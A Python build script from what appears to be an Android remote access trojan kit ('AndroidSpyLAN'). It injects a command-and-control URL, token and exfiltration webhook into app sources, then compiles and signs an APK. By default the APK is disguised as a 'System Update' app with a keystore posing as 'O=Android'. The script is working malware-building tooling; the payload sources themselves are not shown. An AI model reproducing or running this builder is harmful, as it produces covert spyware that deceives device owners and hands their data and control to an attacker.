#!/usr/bin/env python3
"""build.py — renders sources + signs the APK. called by start.py."""

import argparse, os, shutil, subprocess, sys, tempfile, textwrap
from pathlib import Path

HERE = Path(__file__).resolve().parent
SRC  = HERE / "sources"
GRADLE_VERSION = "8.4"

ROOT_BUILD_GRADLE = """
plugins { id 'com.android.application' version '8.2.2' apply false }
"""
SETTINGS_GRADLE = """
pluginManagement { repositories { google(); mavenCentral(); gradlePluginPortal() } }
dependencyResolutionManagement {
    repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS)
    repositories { google(); mavenCentral() }
}
rootProject.name = "AndroidSpyLAN"
include ':app'
"""
GRADLE_PROPERTIES = """
android.useAndroidX=true
android.nonTransitiveRClass=true
org.gradle.jvmargs=-Xmx2048m
"""
APP_BUILD_GRADLE = """
plugins { id 'com.android.application' }
android {
    namespace 'com.local.rat'
    compileSdk 34
    defaultConfig {
        applicationId "com.local.rat"
        minSdk 24
        targetSdk 34
        versionCode 1
        versionName "1.0"
    }
    buildTypes {
        release {
            minifyEnabled false
            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
            signingConfig signingConfigs.release
        }
    }
    signingConfigs {
        release {
            storeFile     file(System.getenv("KEYSTORE_PATH"))
            storePassword System.getenv("KEYSTORE_PASS")
            keyAlias      System.getenv("KEYSTORE_ALIAS")
            keyPassword   System.getenv("KEYSTORE_PASS")
        }
    }
    compileOptions {
        sourceCompatibility JavaVersion.VERSION_17
        targetCompatibility JavaVersion.VERSION_17
    }
}
dependencies {
    implementation 'androidx.appcompat:appcompat:1.6.1'
    implementation 'androidx.core:core:1.12.0'
}
"""
PROGUARD = "-keep class com.local.rat.** { *; }\n"

GRADLEW_SH = """#!/bin/sh
APP_HOME=$(cd "$(dirname "$0")" && pwd)
CLASSPATH=$APP_HOME/gradle/wrapper/gradle-wrapper.jar
if [ -n "$JAVA_HOME" ]; then JAVACMD=$JAVA_HOME/bin/java; else JAVACMD=java; fi
exec "$JAVACMD" -classpath "$CLASSPATH" org.gradle.wrapper.GradleWrapperMain "$@"
"""

def log(m): print(f"[*] {m}", flush=True)
def die(m): print(f"[!] {m}", file=sys.stderr); sys.exit(1)

def ensure_keystore(p: Path):
    if p.exists(): return
    log(f"generating keystore -> {p}")
    keytool = shutil.which("keytool") or "keytool"
    subprocess.run([
        keytool, "-genkeypair", "-keystore", str(p),
        "-alias", "rat", "-keyalg", "RSA", "-keysize", "2048",
        "-validity", "10000", "-storepass", "builderpass",
        "-keypass", "builderpass",
        "-dname", "CN=System, OU=Update, O=Android, L=NA, S=NA, C=US",
    ], check=True)

def render(t: str, s: dict) -> str:
    for k, v in s.items(): t = t.replace(f"{{{{{k}}}}}", str(v))
    return t

def write(p: Path, c: str):
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text(c, encoding="utf-8")

def gradle_wrapper(project: Path):
    w = project / "gradle" / "wrapper"; w.mkdir(parents=True, exist_ok=True)
    write(project / "gradlew", GRADLEW_SH); (project / "gradlew").chmod(0o755)
    write(w / "gradle-wrapper.properties", textwrap.dedent(f"""
        distributionBase=GRADLE_USER_HOME
        distributionPath=wrapper/dists
        distributionUrl=https\\://services.gradle.org/distributions/gradle-{GRADLE_VERSION}-bin.zip
        networkTimeout=10000
        validateDistributionUrl=true
        zipStoreBase=GRADLE_USER_HOME
        zipStorePath=wrapper/dists
    """).strip() + "\n")
    if shutil.which("gradle"):
        subprocess.run(["gradle","wrapper","--gradle-version",GRADLE_VERSION,"--quiet"],
                       cwd=project, check=True)
    else:
        import urllib.request
        urllib.request.urlretrieve(
            f"https://raw.githubusercontent.com/gradle/gradle/v{GRADLE_VERSION}/gradle/wrapper/gradle-wrapper.jar",
            str(w / "gradle-wrapper.jar"))

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--url", required=True)
    ap.add_argument("--token", required=True)
    ap.add_argument("--webhook", required=True)
    ap.add_argument("--name", default="System Update")
    ap.add_argument("--out", default="rat.apk")
    ap.add_argument("--keep", action="store_true")
    a = ap.parse_args()

    sdk = os.environ.get("ANDROID_SDK_ROOT") or os.environ.get("ANDROID_HOME")
    if not sdk or not (Path(sdk)/"platforms"/"android-34").exists():
        die("android SDK 34 not installed. run setup.sh")
    if not SRC.exists(): die(f"missing {SRC}")

    src = {f.name: f.read_text("utf-8") for f in SRC.iterdir() if f.is_file()}
    subs = {
        "C2_URL": a.url, "C2_TOKEN": a.token,
        "WEBHOOK": a.webhook, "APP_NAME": a.name,
    }
    d = Path(tempfile.mkdtemp(prefix="ratbuild_"))
    log(f"build dir: {d}")
    try:
        write(d/"settings.gradle", SETTINGS_GRADLE.strip()+"\n")
        write(d/"build.gradle", ROOT_BUILD_GRADLE.strip()+"\n")
        write(d/"gradle.properties", GRADLE_PROPERTIES.strip()+"\n")
        write(d/"app"/"proguard-rules.pro", PROGUARD)
        write(d/"app"/"build.gradle", APP_BUILD_GRADLE.strip()+"\n")
        gradle_wrapper(d)

        java = d/"app"/"src"/"main"/"java"/"com"/"local"/"rat"
        for n, t in src.items():
            if n.endswith(".java"): write(java/n, render(t, subs))
        write(d/"app"/"src"/"main"/"AndroidManifest.xml", render(src["AndroidManifest.xml"], subs))
        res = d/"app"/"src"/"main"/"res"
        write(res/"values"/"strings.xml", render(src["strings.xml"], subs))
        write(res/"values"/"themes.xml", src["themes.xml"])
        write(res/"xml"/"network_security_config.xml", src["network_security_config.xml"])

        ks = HERE/"rat.keystore"; ensure_keystore(ks)
        os.environ.update(KEYSTORE_PATH=str(ks), KEYSTORE_PASS="builderpass", KEYSTORE_ALIAS="rat")

        log("running gradle assembleRelease...")
        subprocess.run([str(d/"gradlew"),"--no-daemon","assembleRelease"], cwd=d, check=True)

        apk = d/"app"/"build"/"outputs"/"apk"/"release"/"app-release.apk"
        if not apk.exists(): die(f"missing {apk}")
        out = Path(a.out).expanduser().resolve()
        shutil.copy2(apk, out)
        log(f"wrote {out} ({out.stat().st_size} bytes)")
    finally:
        if not a.keep: shutil.rmtree(d, ignore_errors=True)
        else: log(f"kept {d}")

if __name__ == "__main__":
    main()
